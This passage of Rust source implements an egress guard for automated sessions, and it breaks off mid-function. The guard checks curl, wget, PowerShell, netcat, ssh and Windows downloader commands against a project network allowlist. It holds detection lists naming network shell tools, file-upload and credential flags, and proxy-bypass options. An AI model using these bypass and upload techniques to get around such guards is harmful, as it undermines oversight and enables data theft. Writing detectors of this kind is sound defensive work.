// SPDX-License-Identifier: MIT
//! Network list of the loop inside the guard (port of `guard_network.py`).
//!
//! Rules (active ONLY in loop sessions, `LOOP_HEADLESS=1` or `LOOP_ISOLATED=1`; HARD, no PERMISSIONS.json release):
//! - `egress-host`: a request the command makes (curl/wget/iwr/irm, `playwright-cli open|goto|tab-new`, URL literals inside
//!   inline code and inside the script FILE a command runs, the inner command of `testenv exec`) must match the project's
//!   network list: host + path prefix + method, and `cred` when a credential travels. A target the guard cannot prove is blocked.
//! - `egress-content`: a Write/Edit/MultiEdit/NotebookEdit of a code, script, config or `.env` file may not put a URL that is
//!   not on the list in the file.
//! - `egress-tamper`: commands that would switch the run-time layer off.
//! - `env-file`: `.env` files inside the project may be read and written (except the test credentials), outside they are blocked.

use crate::egress::{destinations, ps_param, CURL_PROXY_OPTIONS, CURL_REDIRECT_OPTIONS, CURL_VALUE_LONG, CURL_VALUE_SHORT, EGRESS_TOOL_RE, WGET_VALUE_OPTIONS};
use crate::paths::{inside_any, normalize_path, G};
use crate::pyre::{last_segment, partition, rpartition, Re};
use crate::shell::{command_starts, executable_name, quoted_ranges, shell_event_variants, Event};
use base64::Engine;
use egress_policy::{host_matches, judge, parse_request_url, path_matches, Effective, ORIGIN_LOCAL, TCP, UNKNOWN_METHOD};
use serde_json::Value;
use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::LazyLock;

pub const RULES: [&str; 4] = ["egress-host", "egress-content", "egress-tamper", "env-file"];
const BLOCK_HINT: &str = "(.specs/project/NETWORK.json; ask the user to add it in the Test environment tab)";
const MAX_FILE_BYTES: u64 = 1024 * 1024;
const MAX_DEPTH: usize = 3;
const SENTINEL: &str = "\u{0}VAR\u{0}";

static SECRET_NAME: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(token|secret|passw|credential|private_key|api_?key|auth|pwd)"));
static EXPANDABLE_NAME: LazyLock<Re> = LazyLock::new(|| Re::ci(r"_(?:URL|HOST|BASE)\z"));
static TEMP_HINT: LazyLock<Re> = LazyLock::new(|| Re::ci(r"[\\/](tmp|temp|scratchpad)[\\/]|^/tmp/"));
static VARIABLE_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"\$\{(\w+)\}|\$env:(\w+)|\$([A-Za-z_]\w*)|%([A-Za-z_]\w*)%"));
static URL_LITERAL_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"(?:https?|wss?)://[^\s'"`\\<>)|^]+"#));
static SCRIPT_EXT_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"\.(?:py|pyw|js|mjs|cjs|ts|mts|cts|tsx|jsx|ps1|psm1|sh|bash|zsh)\z"));
static VENDORED_RE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"(?:^|/)(?:node_modules|site-packages|\.venv|venv|\.git|__pycache__)(?:/|\z)"));
static SKIP_CONTENT_RE: LazyLock<Re> = LazyLock::new(|| {
    Re::ci(
        r"\.(?:md|mdx|markdown|rst|txt|adoc|log|csv|tsv|lock|png|jpe?g|gif|webp|ico|bmp|pdf|woff2?|ttf|otf|eot|zip|gz|tgz|7z|rar|jar|dll|exe|so|dylib|mp[34]|mov|wasm|map)\z|(?:^|/)(?:package-lock\.json|npm-shrinkwrap\.json|packages\.lock\.json|pnpm-lock\.yaml|yarn\.lock|poetry\.lock|composer\.lock|Pipfile\.lock)\z",
    )
});
static SCHEME_PREFIX: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z][A-Za-z0-9+.\-]*://"));
static SUBSHELL_RE: LazyLock<Re> = LazyLock::new(|| Re::new(r"\$\(|`|<\("));
static PS_NOT_INLINE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^\$\w+\z|^\(|\$\(|Get-Content|\b(?:gc|cat|type)\b|ReadAll|\bIO\.File"));
static CRED_HEADER: LazyLock<Re> = LazyLock::new(|| Re::ci(r#"(?:^|[\s{;,'"])(?:authorization|proxy-authorization|cookie|x-api-key|x-[\w-]*token)\s*[:=]"#));
static ASSIGNMENT: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z_]\w*\+?="));
static AUTH_SPLIT: LazyLock<Re> = LazyLock::new(|| Re::new(r"[/?#]"));
static URL_WORD: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z][A-Za-z0-9+.\-]*://\S+\z"));
static DNS_TYPE: LazyLock<Re> = LazyLock::new(|| Re::ci(r"^(?:A|AAAA|MX|TXT|NS|SOA|CNAME|ANY|PTR|SRV|AXFR)\z"));
static DRIVE_PATH: LazyLock<Re> = LazyLock::new(|| Re::new(r"^[A-Za-z]:[\\/]"));
static NC_LISTEN: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]*l"));
static LETTER_OPT: LazyLock<Re> = LazyLock::new(|| Re::new(r"^-[A-Za-z]"));

// ---- the result of a judged command ------------------------------------------------------------------------------------------

#[derive(Clone, Debug)]
pub struct HttpCall {
    pub name: String,
    pub method: String,
    pub allowed: bool,
    pub file: bool,
    pub listed: bool,
}

/// What one guard call knows about the project, and what it found (`hits`, `log`).
pub struct Ctx<'g> {
    pub g: &'g G,
    pub root: String,
    pub roots: Vec<String>,
    pub cwd: String,
    pub data_dir: PathBuf,
    pub hits: Vec<(String, String)>,
    pub log: Vec<(String, String)>,
    pub scanned: HashSet<String>,
    pub http_calls: Vec<HttpCall>,
    env: Option<Vec<(String, String)>>,
    effective: Option<Effective>,
}

impl<'g> Ctx<'g> {
    pub fn new(g: &'g G, root: &str, roots: Vec<String>, cwd: Option<&str>) -> Ctx<'g> {
        let cwd = cwd.filter(|c| !c.is_empty()).unwrap_or(root).to_string();
        Ctx {
            g,
            root: root.to_string(),
            roots,
            cwd,
            data_dir: g.env.user_data_dir(),
            hits: vec![],
            log: vec![],
            scanned: HashSet::new(),
            http_calls: vec![],
            env: None,
            effective: None,
        }
    }

    fn normalize(&self, path: &str, base: Option<&str>) -> String {
        normalize_path(self.g, path, base, None)
    }

    fn expand(&self, text: &str) -> String {
        self.g.expand_user_path(text)
    }

    pub fn env(&mut self) -> &Vec<(String, String)> {
        if self.env.is_none() {
            self.env = Some(read_env_values(&self.root));
        }
        self.env.as_ref().expect("set above")
    }

    fn env_names(&mut self) -> Vec<String> {
        let mut names: Vec<String> = self.env().iter().map(|(k, _)| k.clone()).collect();
        names.sort();
        names
    }

    pub fn effective(&mut self) -> &Effective {
        if self.effective.is_none() {
            let names = self.env_names();
            self.effective = Some(egress_policy::load_effective(std::path::Path::new(&self.root), &self.data_dir, &names));
        }
        self.effective.as_ref().expect("set above")
    }

    fn inside(&self, absolute: &str) -> bool {
        inside_any(absolute, &self.roots)
    }

    fn temp_folder(&self, absolute: &str) -> bool {
        let tmp = self.normalize(&std::env::temp_dir().display().to_string(), None);
        TEMP_HINT.is_match(&format!("{absolute}/")) || absolute.starts_with(&format!("{tmp}/"))
    }

    pub fn hit(&mut self, rule: &str, reason: &str) {
        let item = (rule.to_string(), reason.to_string());
        if !self.hits.contains(&item) {
            self.hits.push(item);
        }
    }

    /// Judges one request; records a hit (blocked) or a log line (allowed). Returns true when allowed.
    pub fn request(&mut self, method: &str, url: &str, cred: bool, rule: &str, place_note: &str) -> bool {
        let names = self.env_names();
        let (allowed, kind, reason) = {
            let eff = self.effective().clone();
            judge(&eff, method, url, cred, Some(&names))
        };
        let shown = if method == UNKNOWN_METHOD { "ANY" } else { method };
        let place = match parse_request_url(url) {
            Ok((_, host, _, path)) => format!("{host}{path}"),
            Err(_) => url.chars().take(80).collect(),
        };
        if allowed {
            let item = ("allow".to_string(), format!("{shown} {place}"));
            if !self.log.contains(&item) {
                self.log.push(item);
            }
            return true;
        }
        let text = if kind == egress_policy::Kind::NotListed {
            format!("{shown} {place} is not in this project's network list {BLOCK_HINT}")
        } else {
            format!("{shown} {place}: {reason} {BLOCK_HINT}")
        };
        let prefix = if place_note.is_empty() { String::new() } else { format!("{place_note}: ") };
        self.hit(rule, &format!("{prefix}{text}"));
        false
    }

    pub fn unprovable(&mut self, what: &str, why: &str) {
        self.hit("egress-host", &format!("{what}: {why}; use a literal URL or a *_URL / *_HOST / *_BASE name defined in .specs/project/.env.test {BLOCK_HINT}"));
    }
}

/// `{NAME: value}` of `<project>/.specs/project/.env.test` (non-empty values); values stay inside the guard.
pub fn read_env_values(project_root: &str) -> Vec<(String, String)> {
    let mut values: Vec<(String, String)> = Vec::new();
    let path = std::path::Path::new(project_root).join(".specs").join("project").join(".env.test");
    let Ok(bytes) = std::fs::read(path) else {
        return values;
    };
    let text = String::from_utf8_lossy(&bytes).to_string();
    let text = text.strip_prefix('\u{feff}').unwrap_or(&text);
    for raw in text.lines() {
        let mut line = raw.trim();
        if line.is_empty() || line.starts_with('#') || !line.contains('=') {
            continue;
        }
        if let Some(rest) = line.strip_prefix("export ") {
            line = rest.trim_start();
        }
        let (name, _, value) = partition(line, "=");
        let mut value = value.trim();
        let b = value.as_bytes();
        if b.len() >= 2 && b[0] == b[b.len() - 1] && (b[0] == b'\'' || b[0] == b'"') {
            value = &value[1..value.len() - 1];
        }
        let name = name.trim();
        if !name.is_empty() && !value.is_empty() {
            if let Some(slot) = values.iter_mut().find(|(k, _)| k == name) {
                slot.1 = value.to_string();
            } else {
                values.push((name.to_string(), value.to_string()));
            }
        }
    }
    values
}

// ---- targets: variables, userinfo ----------------------------------------------------------------------------------------------

fn substitute(ctx: &mut Ctx, text: &str) -> String {
    let env = ctx.env().clone();
    VARIABLE_RE.replace_all(text, |m| {
        let name = (1..=4).find_map(|i| m.group(i)).unwrap_or("").to_string();
        let value = env
            .iter()
            .find(|(k, _)| *k == name)
            .map(|(_, v)| v.clone())
            .or_else(|| env.iter().find(|(k, _)| k.to_lowercase() == name.to_lowercase()).map(|(_, v)| v.clone()));
        match value {
            Some(v) if EXPANDABLE_NAME.is_match(&name) => v,
            _ => SENTINEL.to_string(),
        }
    })
}

/// `(url, cred, why)`: the URL a command word names with the allowed variables expanded, or why it cannot be proven.
fn resolve_target(ctx: &mut Ctx, raw: &str) -> (Option<String>, bool, String) {
    let mut text = raw.trim().trim_matches(|c| c == '"' || c == '\'').to_string();
    if text.contains("$(") || text.contains('`') {
        return (None, false, "the target comes from a sub-shell".into());
    }
    text = substitute(ctx, &text);
    let mut cred = false;
    if text.contains(SENTINEL) {
        let scheme = SCHEME_PREFIX.match_start(&text).map(|m| m.text().to_string()).unwrap_or_default();
        let rest = text[scheme.len()..].to_string();
        if scheme.contains(SENTINEL) || text.starts_with(SENTINEL) {
            return (None, false, "the scheme or host is a variable that is not a *_URL/*_HOST/*_BASE name of .env.test".into());
        }
        let (mut authority, tail) = match AUTH_SPLIT.search(&rest) {
            Some(m) => (rest[..m.start].to_string(), rest[m.start..].to_string()),
            None => (rest.clone(), String::new()),
        };
        if authority.contains(SENTINEL) {
            let (userinfo, at, hostport) = rpartition(&authority, "@");
            let mut userinfo = userinfo.to_string();
            if userinfo.contains(SENTINEL) {
                cred = true;
                userinfo = userinfo.replace(SENTINEL, "x");
            }
            let host = if hostport.starts_with('[') {
                match hostport.split_once("]:") {
                    Some((h, _)) => format!("{h}]"),
                    None => hostport.to_string(),
                }
            } else {
                hostport.split(':').next().unwrap_or("").to_string()
            };
            if host.contains(SENTINEL) {
                return (None, false, "the host is a variable that is not a *_URL/*_HOST/*_BASE name of .env.test".into());
            }
            authority = format!("{}{}{}", userinfo, if at { "@" } else { "" }, host);
        }
        let mut path = tail.split('?').next().unwrap_or("").split('#').next().unwrap_or("").to_string();
        if let Some(i) = path.find(SENTINEL) {
            path.truncate(i);
            path = match path.rfind('/') {
                Some(j) => path[..j].to_string(),
                None => String::new(),
            };
        }
        text = format!("{scheme}{authority}{path}");
    }
    let scheme_match = SCHEME_PREFIX.match_start(&text);
    if scheme_match.as_ref().is_some_and(|m| m.text().to_lowercase() == "file://") {
        return (Some(String::new()), false, String::new());
    }
    let after = match &scheme_match {
        Some(m) => text[m.text().len()..].to_string(),
        None => text.clone(),
    };
    let authority = AUTH_SPLIT.split(&after).into_iter().next().unwrap_or_default();
    if authority.contains('@') {
        cred = true;
    }
    (Some(text), cred, String::new())
}

// ---- facts of the HTTP tools ------------------------------------------------------------------------------------------------------

const CURL_UPLOAD: &[&str] =
    &["-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "-F", "--form", "--form-string", "-T", "--upload-file", "--json"];
const CURL_CRED: &[&str] = &["-u", "--user", "--oauth2-bearer", "-n", "--netrc", "--netrc-file", "--netrc-optional", "-b", "--cookie"];
const WGET_UPLOAD: &[&str] = &["--post-data", "--post-file", "--body-data", "--body-file"];
const WGET_CRED: &[&str] = &["--user", "--password", "--http-user", "--http-password", "--ftp-user", "--ftp-password", "--load-cookies", "--proxy-user"];

#[derive(Default, Clone, Debug)]
struct Facts {
    method: Option<String>,
    upload: bool,
    file_upload: bool,
    head: bool,
    get: bool,
    cred: bool,
    tamper: Vec<String>,
    help: bool,
}

fn facts_method(f: &Facts) -> String {
    if let Some(m) = &f.method {
        return m.clone();
    }
    if f.head {
        "HEAD".into()
    } else if f.get {
        "GET".into()
    } else if f.upload {
        "POST".into()
    } else {
        "GET".into()
    }
}

fn curl_body_is_file(option: &str, value: &str) -> bool {
    if option == "-T" || option == "--upload-file" {
        return true;
    }
    if SUBSHELL_RE.is_match(value) {
        return true;
    }
    if ["-F", "--form", "--form-string", "--data-urlencode"].contains(&option) {
        return value.contains('@') || (option != "--data-urlencode" && value.contains('<'));
    }
    value.starts_with('@')
}

fn curl_long_values() -> Vec<&'static str> {
    let mut v: Vec<&'static str> = CURL_VALUE_LONG.to_vec();
    v.extend(CURL_PROXY_OPTIONS);
    v.extend(CURL_REDIRECT_OPTIONS);
    v.extend(["--url", "--netrc-file"]);
    v
}

fn curl_apply(facts: &mut Facts, option: &str, value: &str) {
    if option == "-X" || option == "--request" {
        let up = value.to_uppercase();
        facts.method = if up.is_empty() { None } else { Some(up) };
    } else if option == "-I" || option == "--head" {
        facts.head = true;
    } else if option == "-G" || option == "--get" {
        facts.get = true;
    } else if CURL_UPLOAD.contains(&option) || option.starts_with("--data") || option.starts_with("--form") {
        facts.upload = true;
        facts.file_upload = facts.file_upload || curl_body_is_file(option, value);
    } else if option == "-H" || option == "--header" {
        facts.cred = facts.cred || CRED_HEADER.is_match(value);
    } else if CURL_CRED.contains(&option) {
        facts.cred = true;
    } else if ["-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname"].contains(&option) {
        facts.tamper.push(format!("curl {option} sends the request through another proxy and skips the loop's egress layer"));
    } else if option == "--noproxy" {
        facts.tamper.push("curl --noproxy skips the loop's egress proxy".into());
    } else if ["-h", "--help", "-V", "--version", "--manual"].contains(&option) {
        facts.help = true;
    }
}

fn curl_facts(args: &[String]) -> Facts {
    let mut facts = Facts::default();
    let longs = curl_long_values();
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if word.starts_with("--") {
            let (option, equals, v) = partition(word, "=");
            let mut value = v.to_string();
            if longs.contains(&option) && !equals && index < args.len() {
                value = args[index].clone();
                index += 1;
            }
            curl_apply(&mut facts, option, &value);
        } else if word.starts_with('-') && word.chars().count() > 1 {
            let chars: Vec<char> = word.chars().collect();
            for position in 1..chars.len() {
                let letter = chars[position];
                if CURL_VALUE_SHORT.contains(letter) {
                    let mut value: String = chars[position + 1..].iter().collect();
                    if value.is_empty() && index < args.len() {
                        value = args[index].clone();
                        index += 1;
                    }
                    curl_apply(&mut facts, &format!("-{letter}"), &value);
                    break;
                }
                curl_apply(&mut facts, &format!("-{letter}"), "");
            }
        }
    }
    facts
}

fn wget_facts(args: &[String]) -> Facts {
    let mut facts = Facts::default();
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if !word.starts_with('-') {
            continue;
        }
        let (option, equals, v) = if word.starts_with("--") {
            let (o, e, v) = partition(word, "=");
            (o.to_string(), e, v.to_string())
        } else {
            (word.clone(), false, String::new())
        };
        let mut value = v;
        if !equals && (WGET_VALUE_OPTIONS.contains(&option.as_str()) || option == "-e" || option == "--execute") && index < args.len() {
            value = args[index].clone();
            index += 1;
        }
        if option == "--method" {
            let up = value.to_uppercase();
            facts.method = if up.is_empty() { None } else { Some(up) };
        } else if WGET_UPLOAD.contains(&option.as_str()) {
            facts.upload = true;
            facts.file_upload = facts.file_upload || option == "--post-file" || option == "--body-file" || SUBSHELL_RE.is_match(&value);
        } else if option == "--spider" {
            facts.head = true;
        } else if option == "--header" {
            facts.cred = facts.cred || CRED_HEADER.is_match(&value);
        } else if WGET_CRED.contains(&option.as_str()) {
            facts.cred = true;
        } else if option == "--no-proxy" {
            facts.tamper.push("wget --no-proxy skips the loop's egress proxy".into());
        } else if (option == "-e" || option == "--execute") && Re::ci("proxy").is_match(&value) {
            facts.tamper.push("wget -e proxy setting overrides the loop's egress proxy".into());
        } else if ["-h", "--help", "-V", "--version"].contains(&option.as_str()) {
            facts.help = true;
        }
    }
    facts
}

fn powershell_facts(args: &[String]) -> Facts {
    let mut facts = Facts::default();
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        let second_alpha = word.chars().nth(1).is_some_and(|c| c.is_alphabetic());
        if !(word.starts_with('-') && word.chars().count() > 1 && second_alpha) {
            continue;
        }
        let (parameter, switch) = ps_param(word);
        let stripped = word.trim_start_matches('-');
        let (_, colon, after) = partition(stripped, ":");
        let mut value = String::new();
        if colon {
            value = after.to_string();
        } else if parameter.is_some() && !switch && index < args.len() {
            value = args[index].clone();
            index += 1;
        }
        match parameter {
            Some("Method") | Some("CustomMethod") => {
                let up = value.to_uppercase();
                facts.method = if up.is_empty() { None } else { Some(up) };
            }
            Some("Body") | Some("InFile") | Some("Form") => {
                facts.upload = true;
                facts.file_upload = facts.file_upload || parameter != Some("Body") || PS_NOT_INLINE.is_match(&value);
            }
            Some("Headers") => {
                let mut parts = vec![value.clone()];
                while index < args.len() && !LETTER_OPT.is_match(&args[index]) {
                    parts.push(args[index].clone());
                    index += 1;
                }
                facts.cred = facts.cred || CRED_HEADER.is_match(&parts.join(" "));
            }
            Some("Credential") | Some("Authentication") | Some("Token") | Some("UseDefaultCredentials") | Some("WebSession") => facts.cred = true,
            Some("NoProxy") => facts.tamper.push("-NoProxy skips the loop's egress proxy".into()),
            _ => {}
        }
    }
    facts
}

fn http_family(name: &str) -> Option<&'static str> {
    match name {
        "curl" => Some("curl"),
        "wget" => Some("wget"),
        "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm" => Some("powershell"),
        _ => None,
    }
}

// ---- other network tools: raw sockets, remote shells, DNS, Windows downloaders ----------------------------------------------------

fn socket_default_port(name: &str) -> Option<u32> {
    Some(match name {
        "nc" | "ncat" | "netcat" | "test-netconnection" | "tnc" => 0,
        "telnet" => 23,
        "ftp" => 21,
        "ssh" | "scp" | "sftp" => 22,
        "nslookup" | "dig" | "host" => 53,
        _ => return None,
    })
}

fn net_value_options(name: &str) -> &'static str {
    match name {
        "nc" | "ncat" | "netcat" => "pswWeiXxTqIOZ",
        "telnet" => "bel",
        "ssh" => "bcDEeFIiJLlmOopQRSWw",
        "scp" => "cFiJloPS",
        "sftp" => "BbcDFiJloPRSsX",
        "dig" => "bcfkmpqtxy",
        "host" => "cNnrRtWmi",
        _ => "",
    }
}

fn net_port_option(name: &str) -> Option<char> {
    match name {
        "nc" | "ncat" | "netcat" | "ssh" | "dig" => Some('p'),
        "scp" | "sftp" => Some('P'),
        _ => None,
    }
}

fn is_net_url_tool(name: &str) -> bool {
    matches!(name, "start-bitstransfer" | "certutil" | "bitsadmin")
}

fn ps_value(args: &[String], names: &[&str]) -> Option<String> {
    for (index, word) in args.iter().enumerate() {
        if !word.starts_with('-') {
            continue;
        }
        let stripped = word.trim_start_matches('-');
        let (name, colon, value) = partition(stripped, ":");
        if !name.is_empty() && names.iter().any(|item| item.to_lowercase().starts_with(&name.to_lowercase())) {
            return if colon { Some(value.to_string()) } else { args.get(index + 1).cloned() };
        }
    }
    None
}

fn split_host_port(text: &str, default_port: &str) -> (String, String) {
    let mut text = text.trim_matches(|c| c == '"' || c == '\'').to_string();
    if SCHEME_PREFIX.match_start(&text).is_some() {
        text = text[text.find("://").map(|i| i + 3).unwrap_or(0)..].to_string();
    }
    let first = AUTH_SPLIT.split(&text).into_iter().next().unwrap_or_default();
    let text = rpartition(&first, "@").2.to_string();
    if text.starts_with('[') {
        let (host, _, rest) = partition(&text, "]");
        let port = rest.strip_prefix(':').unwrap_or("");
        return (format!("{host}]"), if port.is_empty() { default_port.to_string() } else { port.to_string() });
    }
    let (host, colon, port) = partition(&text, ":");
    (host.to_string(), if colon && !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) { port.to_string() } else { default_port.to_string() })
}

/// `[(host, port)]` a socket/remote/DNS tool talks to; the port is text ('0' = not stated); empty when it names none.
fn net_socket_targets(name: &str, args: &[String]) -> Vec<(String, String)> {
    let default = socket_default_port(name).unwrap_or(0);
    if name == "test-netconnection" || name == "tnc" {
        let host = ps_value(args, &["ComputerName", "CommonTCPPort", "RemoteAddress"])
            .filter(|v| !v.is_empty())
            .or_else(|| args.iter().find(|w| !w.starts_with('-')).cloned())
            .unwrap_or_default();
        let port = ps_value(args, &["Port"]).filter(|v| !v.is_empty()).unwrap_or_else(|| default.to_string());
        let host = host.trim_matches(|c| c == '"' || c == '\'').to_string();
        return if host.is_empty() { vec![] } else { vec![(host, port)] };
    }
    let values = net_value_options(name);
    let ports = net_port_option(name);
    let mut positional: Vec<String> = Vec::new();
    let mut port_option = String::new();
    let mut index = 0;
    while index < args.len() {
        let word = &args[index];
        index += 1;
        if ["nc", "ncat", "netcat"].contains(&name) && NC_LISTEN.is_match(word) {
            return vec![];
        }
        if ["--help", "-h", "-V", "--version"].contains(&word.as_str()) {
            return vec![];
        }
        if word.starts_with("--") || (word.starts_with('+') && name == "dig") {
            continue;
        }
        if word.starts_with('-') && word.chars().count() > 1 {
            let letters: Vec<char> = word.chars().skip(1).collect();
            for (position, letter) in letters.iter().enumerate() {
                if values.contains(*letter) {
                    let tail: String = letters[position + 1..].iter().collect();
                    let value = if !tail.is_empty() { tail.clone() } else { args.get(index).cloned().unwrap_or_default() };
                    if tail.is_empty() {
                        index += 1;
                    }
                    if Some(*letter) == ports {
                        port_option = value;
                    }
                    break;
                }
            }
            continue;
        }
        positional.push(word.clone());
    }
    if positional.is_empty() {
        return vec![];
    }
    if name == "dig" {
        let servers: Vec<String> = positional.iter().filter(|i| i.starts_with('@')).map(|i| i[1..].to_string()).collect();
        let names: Vec<String> = positional.iter().filter(|i| !i.starts_with('@') && !DNS_TYPE.is_match(i)).cloned().collect();
        let port = if port_option.is_empty() { "53".to_string() } else { port_option.clone() };
        return names.iter().take(1).chain(servers.iter()).map(|i| (i.clone(), port.clone())).collect();
    }
    if name == "nslookup" || name == "host" {
        return positional.iter().take(2).map(|i| (i.clone(), "53".to_string())).collect();
    }
    let mut port = if port_option.is_empty() { default.to_string() } else { port_option.clone() };
    if ["nc", "ncat", "netcat", "telnet"].contains(&name) {
        if positional.len() > 1 && !positional[1].is_empty() && positional[1].chars().all(|c| c.is_ascii_digit()) {
            port = positional[1].clone();
        } else if name != "telnet" && port_option.is_empty() {
            port = "0".into();
        }
        return vec![(positional[0].clone(), port)];
    }
    if name == "scp" {
        let mut hosts = Vec::new();
        for item in &positional {
            if DRIVE_PATH.is_match(item) || item.starts_with('.') || item.starts_with('/') || item.starts_with('~') || !item.contains(':') {
                continue;
            }
            let source = if !item.contains("://") { partition(item, ":").0.to_string() } else { item.clone() };
            hosts.push(split_host_port(&source, &port));
        }
        return hosts;
    }
    if name == "sftp" {
        let first = &positional[0];
        let source = if !first.contains("://") { partition(first, ":").0.to_string() } else { first.clone() };
        return vec![split_host_port(&source, &port)];
    }
    vec![split_host_port(&positional[0], &port)]
}

fn join_words(words: &[String]) -> String {
    static SPECIAL: LazyLock<Re> = LazyLock::new(|| Re::new(r#"[\s"'$;&|<>()`]"#));
    words
        .iter()
        .map(|w| {
            if w.is_empty() || SPECIAL.is_match(w) {
                if !w.contains('"') {
                    format!("\"{w}\"")
                } else if !w.contains('\'') {
                    format!("'{w}'")
                } else {
                    w.replace(['"', '\''], "")
                }
            } else {
                w.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// A command word with the allowed variables replaced by their values and every other variable by `$UNPROVABLE`.
fn expand_word(ctx: &mut Ctx, word: &str) -> String {
    if !word.contains('$') && !word.contains('%') {
        return word.to_string();
    }
    let env = ctx.env().clone();
    VARIABLE_RE.replace_all(word, |m| {
        let name = (1..=4).find_map(|i| m.group(i)).unwrap_or("").to_string();
        let value = env
            .iter()
            .find(|(k, _)| *k == name)
            .map(|(_, v)| v.clone())
            .or_else(|| env.iter().find(|(k, _)| k.to_lowercase() == name.to_lowercase()).map(|(_, v)| v.clone()));
        let replaced = match value {
            Some(v) if EXPANDABLE_NAME.is_match(&name) => v,
            _ => SENTINEL.to_string(),
        };
        replaced.replace(SENTINEL, "$UNPROVABLE")
    })
}

fn net_tool(ctx: &mut Ctx, name: &str, args: &[String], raw: &str) {
    if is_net_url_tool(name) {
        let mut urls: Vec<String> = args.iter().map(|w| w.trim_matches(|c| c == '"' || c == '\'').to_string()).filter(|w| URL_WORD.is_match(w)).collect();
        if name == "start-bitstransfer" {
            if let Some(v) = ps_value(args, &["Source"]) {
                let v = v.trim_matches(|c| c == '"' || c == '\'').to_string();
                if !v.is_empty() && !URL_WORD.is_match(&v) {
                    urls.push(v);
                }
            }
        }
        for target in urls {
            let expanded = expand_word(ctx, &target);
            let (url, cred, why) = resolve_target(ctx, &expanded);
            if !why.is_empty() {
                let shown: String = target.chars().take(60).collect();
                ctx.unprovable(&format!("{name} {shown}"), &why);
            } else if let Some(url) = url.filter(|u| !u.is_empty()) {
                ctx.request("GET", &url, cred, "egress-host", "");
            }
        }
        return;
    }
    let expanded: Vec<String> = args.iter().map(|a| expand_word(ctx, a)).collect();
    let targets = net_socket_targets(name, &expanded);
    if targets.is_empty() && SUBSHELL_RE.is_match(raw) {
        ctx.unprovable(name, "no target found (a sub-shell may hold it)");
    }
    for (host, port) in targets {
        if host.is_empty() {
            continue;
        }
        let spec = if port != "0" { format!("tcp://{host}:{port}") } else { format!("tcp://{host}") };
        let (url, cred, why) = resolve_target(ctx, &spec);
        if !why.is_empty() {
            let shown: String = host.chars().take(60).collect();
            ctx.unprovable(&format!("{name} {shown}"), &why);
        } else if let Some(url) = url.filter(|u| !u.is_empty()) {
            ctx.request(TCP, &url, cred, "egress-host", "");
        }
    }
}

fn http_tool(ctx: &mut Ctx, name: &str, args: &[String], cred_forced: bool) {
    let family = http_family(name).expect("checked by the caller");
    let facts = match family {
        "curl" => curl_facts(args),
        "wget" => wget_facts(args),
        _ => powershell_facts(args),
    };
    for reason in &facts.tamper {
        ctx.hit("egress-tamper", reason);
    }
    let mut words = vec![name.to_string()];
    for a in args {
        words.push(expand_word(ctx, a));
    }
    let (targets, redirected) = destinations(&join_words(&words), family);
    if redirected {
        ctx.unprovable(name, "--resolve, --connect-to or a non-local proxy sends the request elsewhere, so the target cannot be proven");
    }
    if targets.is_empty() {
        if !facts.help && !redirected {
            ctx.unprovable(name, "no target URL found (a sub-shell, a config file or an input list hides it)");
        }
        return;
    }
    let method = facts_method(&facts);
    for target in targets {
        let (url, cred, why) = resolve_target(ctx, &target);
        if !why.is_empty() {
            let shown: String = target.chars().take(60).collect();
            ctx.unprovable(&format!("{name} {shown}"), &why);
        } else if let Some(url) = url.filter(|u| !u.is_empty()) {
            let allowed = ctx.request(&method, &url, cred || facts.cred || cred_forced, "egress-host", "");
            let names = ctx.env_names();
            let listed = allowed && entry_lists_method(ctx.effective(), &method, &url, &names);
            ctx.http_calls.push(HttpCall { name: name.to_string(), method: method.clone(), allowed, file: facts.file_upload, listed });
        }
    }
}

/// True when an ACTIVE, non-local allow entry that matches host, port and path names this exact HTTP method.
fn entry_lists_method(effective: &Effective, method: &str, url: &str, env_names: &[String]) -> bool {
    let method = if method == UNKNOWN_METHOD {
        UNKNOWN_METHOD.to_string()
    } else if method.eq_ignore_ascii_case(TCP) {
        TCP.into()
    } else {
        method.trim().to_uppercase()
    };
    if method == UNKNOWN_METHOD || method == TCP {
        return false;
    }
    let Ok((_, host, port, path)) = parse_request_url(url) else {
        return false;
    };
    for entry in &effective.allow {
        if entry.origin == ORIGIN_LOCAL || (!entry.if_missing.is_empty() && env_names.contains(&entry.if_missing)) {
            continue;
        }
        if host_matches(&entry.host, &host) && entry.port.is_none_or(|p| Some(p) == port) && path_matches(&entry.path, &path) && entry.methods.contains(&method) {
            return true;
        }
    }
    false
}

/// `egress-upload` exception (loop sessions only): every curl/wget/iwr/irm call of `statement` is judged by the network
/// list, allowed with a method an entry lists, and carries its body inline.
pub fn inline_upload_allowed(ctx: &Ctx, statement: &str) -> bool {
    let mut probe = Ctx::new(ctx.g, &ctx.root, ctx.roots.clone(), Some(&ctx.cwd));
    probe.data_dir = ctx.data_dir.clone();
    probe.env = ctx.env.clone().or_else(|| Some(read_env_values(&ctx.root)));
    probe.effective = ctx.effective.clone();
    scan_command(&mut probe, statement, false, 0);
    let spans = quoted_ranges(statement);
    let tools = EGRESS_TOOL_RE
        .find_all(statement)
        .into_iter()
        .filter(|m| {
            let start = statement[..m.start].chars().count();
            !spans.iter().any(|(s, e)| *s < start && start < *e)
        })
        .count();
    if !probe.hits.is_empty() || probe.http_calls.is_empty() || probe.http_calls.len() < tools {
        return false;
    }
    probe.http_calls.iter().all(|c| c.allowed && c.listed && !c.file)
}

// ---- URL literals in code --------------------------------------------------------------------------------------------------------

fn url_literals(text: &str) -> Vec<String> {
